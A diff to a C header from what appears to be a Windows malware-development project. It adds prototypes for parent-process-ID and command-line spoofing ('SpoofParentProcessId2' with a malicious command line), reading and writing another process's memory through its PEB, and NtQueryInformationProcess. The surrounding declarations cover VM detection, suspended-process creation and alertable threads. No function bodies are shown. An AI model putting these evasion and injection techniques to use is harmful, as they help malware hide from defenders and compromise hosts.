@@ -6,13 +6,13 @@
 #include <stdlib.h>
 #include <TlHelp32.h>
 #include <Psapi.h>
+#include "Encryption.h"
 #include "Win32FindDataArray.h"
 #include "resource.h"
 #include <winternl.h>
 #include <setupAPI.h>
 
 #define		CRT_SECURE_NO_WARNINGS
-
 
 typedef struct _RESOURCE
 {
@@ -36,6 +36,25 @@ __kernel_entry NTSTATUS NTQuerySystemInformation
 	IN              ULONG                    SystemInformationLength,
 	   OUT OPTIONAL PULONG                   ReturnLength
 );
+
+typedef NTSTATUS (NTAPI  *fnNTQueryProcessInformation)
+(
+	IN              HANDLE           ProcessHandle,
+	IN              PROCESSINFOCLASS ProcessInformationClass,
+	   OUT          PVOID            ProcessInformation,
+	IN              ULONG            ProcessInformationLength,
+	   OUT OPTIONAL PULONG           ReturnLength
+);
+
+__kernel_entry NTSTATUS NTQueryProcessInformation
+(
+	IN              HANDLE           ProcessHandle,
+	IN              PROCESSINFOCLASS ProcessInformationClass,
+	   OUT          PVOID            ProcessInformation,
+	IN              ULONG            ProcessInformationLength,
+	   OUT OPTIONAL PULONG           ReturnLength
+);
+
 BOOLEAN CreateDebuggedProcess
 (
 	IN     PCHAR   pProcessName,
@@ -43,6 +62,7 @@ BOOLEAN CreateDebuggedProcess
 	   OUT PHANDLE phProcessHandle,
 	   OUT PHANDLE phThreadHandle
 );
+
 BOOLEAN CreateSuspendedProcess
 (
 	IN     PSTR    pProcessName,
@@ -75,7 +95,7 @@ INT8 CheckVM
 	IN     void
 );
 
-BOOLEAN FetchLocalAllertableThread
+BOOLEAN FetchLocalAlertableThread
 (
 	IN     DWORD   dwMainThreadId,
 	   OUT PDWORD  pdwAlertedThreadId,
@@ -181,4 +201,29 @@ BOOLEAN SpoofParentProcessId
 	   OUT PHANDLE phMaliciousProcessHandle,
 	   OUT PDWORD  pdwMaliciousThreadId,
 	   OUT PHANDLE phMaliciousThreadHandle
+);
+
+BOOLEAN SpoofParentProcessId2
+(
+	IN     LPWSTR   pSpoofedCommandLine,
+	IN	   LPWSTR   pMaliciousCommandLine,
+	   OUT PHANDLE phProcessHandle,
+	   OUT PDWORD  pdwProcessId,
+	   OUT PDWORD  pdwThreadId 
+);
+
+BOOLEAN ReadFromTargetProcess
+(
+	IN     HANDLE hTargetProcess, 
+	IN     PVOID  pPEBBaseAddress, 
+	   OUT PVOID *pReadBufferAddress, 
+	IN     DWORD  dwBufferSize
+);
+
+BOOLEAN WriteToTargetProcess
+(
+	IN      HANDLE hProcess,
+	IN      PVOID pAddressToWriteTo,
+	IN      PVOID pBuffer,
+	IN      DWORD dwBufferSize
 );
